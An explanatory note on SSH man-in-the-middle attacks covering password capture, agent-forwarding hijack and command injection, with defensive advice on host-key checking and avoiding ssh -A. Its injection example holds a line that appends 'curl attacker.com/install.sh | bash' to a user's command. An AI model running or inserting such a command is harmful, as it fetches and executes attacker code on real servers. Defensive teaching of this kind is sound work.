_MITM 

Step 3 — Credentials are stolen

Depending on auth method:

Password auth

Attacker captures your password

Logs in later as you

Full compromise

SSH key auth

Attacker can:

Log commands

Capture agent-forwarded sessions

Inject commands

Still very bad

You never notice.

“Capture agent-forwarded sessions”
First: what is SSH agent forwarding?

Normally:

Your private SSH key never leaves your laptop

The server only sees proof you own it

With agent forwarding (ssh -A):

Your local ssh-agent is made available on the remote server

The server can ask your agent:

“Please sign this challenge”

The key is still local — but signing requests can be proxied.

Why people use agent forwarding

You SSH into a bastion

From there, you SSH into other servers

Without copying private keys around

Convenient — but dangerous.

What “capture agent-forwarded sessions” means

If an attacker MITMs your SSH connection and you use agent forwarding:

You ──> Attacker (fake server) ──> Real server


The attacker:

Gets access to your forwarded SSH agent

Can issue signing requests while the session is active

They cannot steal your private key, but they can:

Authenticate as you to other servers

Access Git repos

Move laterally in your infrastructure

This is sometimes called agent hijacking.

Concrete example

You connect with:

ssh -A admin@bastion


Attacker MITMs the connection.

Now the attacker can:

ssh db.internal
ssh git.internal


Using your identity — silently.

Why SSH host keys stop this

If host keys are verified:

MITM never succeeds

Agent is never exposed

2️⃣ “Inject commands”

This is about command manipulation, not stealing secrets.

How command injection works in SSH MITM

Once the attacker is between you and the real server:

They can see and modify the SSH data stream

Even though it’s encrypted end-to-end — for them

They decrypt your traffic, then re-encrypt it to the server.

What “inject commands” means

The attacker can:

Insert commands you didn’t type

Modify commands in transit

Hide output

Fake command results

Concrete example

You type:

ls /var/log


Attacker forwards:

ls /var/log; curl attacker.com/install.sh | bash


You see:

auth.log
syslog


You never see the injected command or its output.

Why this is devastating

No password theft required

No key theft required

Full server compromise

Leaves little evidence

Why encryption doesn’t stop this

This is crucial:

Encryption protects against outsiders.

A MITM becomes an endpoint, so:

Encryption works for them

They see plaintext

They can modify it

Authentication (host keys) is what blocks this.

Why these attacks are often underestimated

People think:

“I’m using SSH keys, not passwords, so I’m safe.”

But:

Agent forwarding exposes signing power

MITM defeats encryption

Host key checking is the real defense

Practical safety rules (important)
 Avoid
ssh -A ...

 Prefer
ssh -J bastion target


Or:

Per-host agent forwarding

Short-lived keys

ForwardAgent no by default

